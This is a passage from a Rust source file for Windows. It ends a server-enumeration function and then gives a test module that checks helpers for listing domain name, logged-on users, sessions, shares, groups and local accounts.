                u32::MAX, // MAX_PREFERRED_LENGTH
                &mut entries_read,
                &mut total_entries,
                server_type,
                domain_ptr,
                &mut resume_handle,
            )
        };

        if !buf.is_null() && entries_read > 0 {
            // SAFETY: `buf` points to an array of `entries_read` SERVER_INFO_101 structs.
            let entries = unsafe {
                std::slice::from_raw_parts(buf as *const SERVER_INFO_101, entries_read as usize)
            };
            for entry in entries {
                if !entry.sv101_name.is_null() {
                    // SAFETY: `sv101_name` is a valid null-terminated UTF-16 string.
                    let name = unsafe {
                        let mut len = 0usize;
                        while *entry.sv101_name.add(len) != 0 {
                            len += 1;
                        }
                        std::slice::from_raw_parts(entry.sv101_name, len)
                    };
                    names.push(String::from_utf16_lossy(name));
                }
            }
        }

        if !buf.is_null() {
            // SAFETY: `buf` was allocated by `NetServerEnum`.
            unsafe { NetApiBufferFree(buf as *mut _) };
        }

        if status != ERROR_MORE_DATA {
            break;
        }
    }

    names
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A null pointer must return an empty String, not cause UB.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_null_pointer_returns_empty() {
        // SAFETY: testing the explicit null-pointer guard.
        let result = unsafe { wstr_to_string(std::ptr::null()) };
        assert!(result.is_empty());
    }

    /// A well-formed ASCII UTF-16 string must round-trip correctly.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_roundtrips_ascii() {
        let wide: Vec<u16> = "hello\0".encode_utf16().collect();
        // SAFETY: `wide` is a stack-allocated null-terminated UTF-16 slice.
        let result = unsafe { wstr_to_string(wide.as_ptr()) };
        assert_eq!(result, "hello");
    }

    /// An empty UTF-16 string (NUL only) must return an empty Rust String.
    #[cfg(windows)]
    #[test]
    fn wstr_to_string_empty_wide_string_returns_empty() {
        let wide: Vec<u16> = [0u16].to_vec();
        // SAFETY: single-NUL slice is valid.
        let result = unsafe { wstr_to_string(wide.as_ptr()) };
        assert!(result.is_empty());
    }

    /// Must not panic on any Windows machine (domain-joined or workstation).
    #[cfg(windows)]
    #[test]
    fn platform_domain_name_does_not_panic() {
        let _ = platform_domain_name();
    }

    /// Result must not contain embedded NUL characters (buffer truncation bug).
    #[cfg(windows)]
    #[test]
    fn platform_domain_name_no_embedded_nuls() {
        let name = platform_domain_name();
        assert!(
            !name.contains('\0'),
            "domain name must not contain embedded NUL characters; got: {name:?}"
        );
    }

    /// Must not panic on any Windows machine.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_does_not_panic() {
        let _ = platform_logged_on_users();
    }

    /// The currently logged-in user (from %USERNAME%) must appear in the list.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_contains_current_user() {
        let users = platform_logged_on_users();
        let current = std::env::var("USERNAME").unwrap_or_default();
        if !current.is_empty() {
            assert!(
                users.iter().any(|u| u.eq_ignore_ascii_case(&current)),
                "current user {current:?} not found in logged-on users: {users:?}"
            );
        }
    }

    /// All returned user names must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_logged_on_users_entries_have_no_embedded_nuls() {
        for u in platform_logged_on_users() {
            assert!(!u.contains('\0'), "user name must not contain NUL: {u:?}");
        }
    }

    /// Must not panic — may return an empty Vec on a workstation.
    #[cfg(windows)]
    #[test]
    fn platform_sessions_does_not_panic() {
        let _ = platform_sessions();
    }

    /// All returned session entries must have NUL-free string fields.
    #[cfg(windows)]
    #[test]
    fn platform_sessions_entries_have_valid_string_fields() {
        for s in platform_sessions() {
            assert!(
                !s.client.contains('\0'),
                "session.client must not contain NUL: {:?}",
                s.client
            );
            assert!(!s.user.contains('\0'), "session.user must not contain NUL: {:?}", s.user);
        }
    }

    /// IPC$ is always present on Windows — the Server service creates it automatically.
    /// ADMIN$ requires admin privileges to enumerate and may be absent on hardened hosts,
    /// so we only assert IPC$ presence (not ADMIN$) and that all names are NUL-free.
    #[cfg(windows)]
    #[test]
    fn platform_shares_includes_ipc_dollar_and_admin_dollar() {
        let shares = platform_shares();
        let names: Vec<&str> = shares.iter().map(|s| s.name.as_str()).collect();
        // IPC$ is always enumerable; ADMIN$ may be hidden from non-admin callers.
        assert!(
            names.iter().any(|n| n.eq_ignore_ascii_case("IPC$")),
            "IPC$ must be present on any Windows machine; got: {names:?}"
        );
        // All returned names must be NUL-free (structural check, host-independent).
        for name in &names {
            assert!(!name.contains('\0'), "share name must not contain NUL: {name:?}");
        }
    }

    /// All share name/path fields must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_shares_string_fields_have_no_embedded_nuls() {
        for s in platform_shares() {
            assert!(!s.name.contains('\0'), "share.name must not contain NUL: {:?}", s.name);
            assert!(!s.path.contains('\0'), "share.path must not contain NUL: {:?}", s.path);
            assert!(!s.remark.contains('\0'), "share.remark must not contain NUL: {:?}", s.remark);
        }
    }

    /// The built-in Administrators and Users groups must be present on every
    /// Windows installation since Windows XP.  The Administrators group name is
    /// resolved via its well-known SID so the test passes on non-English Windows
    /// (e.g. "Administratoren" on German, "Administrateurs" on French).
    #[cfg(windows)]
    #[test]
    fn platform_groups_includes_administrators_and_users() {
        let groups = platform_groups();
        let names: Vec<&str> = groups.iter().map(|g| g.name.as_str()).collect();

        // Resolve the localized Administrators name via SID lookup; fall back to
        // a non-empty check if the SID resolution is unavailable (degraded host).
        if let Some(admin_w) = builtin_administrators_name_w() {
            // Trim the NUL terminator and convert to UTF-8 for comparison.
            let admin_name =
                String::from_utf16_lossy(admin_w.split(|&c| c == 0).next().unwrap_or(&[]));
            assert!(
                names.iter().any(|n| n.eq_ignore_ascii_case(&admin_name)),
                "built-in Administrators group ({admin_name:?}) must exist; got: {names:?}"
            );
        } else {
            // SID lookup unavailable — just verify the group list is non-empty.
            assert!(!names.is_empty(), "expected at least one local group; got none");
        }

        assert!(
            names.iter().any(|n| n.eq_ignore_ascii_case("Users")),
            "Users group must exist on any Windows machine; got: {names:?}"
        );
    }

    /// Group name/description must be free of embedded NUL characters.
    #[cfg(windows)]
    #[test]
    fn platform_groups_string_fields_have_no_embedded_nuls() {
        for g in platform_groups() {
            assert!(!g.name.contains('\0'), "group.name must not contain NUL: {:?}", g.name);
            assert!(
                !g.description.contains('\0'),
                "group.description must not contain NUL: {:?}",
                g.description
            );
        }
    }

    /// `NetUserEnum` must return at least one local user account.
    #[cfg(windows)]
    #[test]
    fn platform_users_returns_at_least_one_account() {
        let users = platform_users();
        assert!(!users.is_empty(), "expected at least one local user account from NetUserEnum");
    }

    /// At least one account must be flagged as admin when `administrators_group_members`
    /// returns a non-empty set.  If the SID lookup or ACL check fails on a restricted
    /// host, `administrators_group_members` returns an empty set and this check is
    /// skipped rather than producing a spurious failure.
    #[cfg(windows)]
    #[test]
    fn platform_users_includes_at_least_one_admin_account() {
        let admin_names = administrators_group_members();
        if admin_names.is_empty() {
            // SID resolution or ACL check unavailable — soft skip.
            return;
        }
        let users = platform_users();
        assert!(
            users.iter().any(|u| u.is_admin),
            "at least one user with is_admin=true expected; got: {:?}",
            users.iter().map(|u| (&u.name, u.is_admin)).collect::<Vec<_>>()
        );
    }

    /// Every username returned by `administrators_group_members` that also
    /// appears in `platform_users` must have `is_admin = true`.
    /// If `administrators_group_members` returns empty (degraded host / restricted
    /// ACL), the stronger assertions are skipped rather than failing spuriously.
    #[cfg(windows)]
    #[test]
    fn platform_users_marks_administrators_group_members_as_admin() {
        let admin_names = administrators_group_members();
        if admin_names.is_empty() {
            // SID resolution or ACL check unavailable — soft skip.
            return;
        }
        let users = platform_users();
        for u in &users {
            if admin_names.contains(&u.name.to_ascii_lowercase()) {
                assert!(
                    u.is_admin,
                    "user {:?} is in Administrators group but is_admin=false",
                    u.name
                );
            }
        }
    }

    /// `administrators_group_members` must return non-empty, NUL-free names.
    #[cfg(windows)]
    #[test]
    fn administrators_group_members_names_are_non_empty_and_nul_free() {
        for name in administrators_group_members() {
            assert!(!name.is_empty(), "admin member name must not be empty");
            assert!(!name.contains('\0'), "admin member name must not contain NUL: {name:?}");
        }
    }

    /// All user name fields must be non-empty and free of embedded NUL chars.
    #[cfg(windows)]
    #[test]
    fn platform_users_names_are_non_empty_and_nul_free() {
        for u in platform_users() {
            assert!(!u.name.is_empty(), "user.name must not be empty");
            assert!(!u.name.contains('\0'), "user.name must not contain NUL: {:?}", u.name);
        }
    }
}
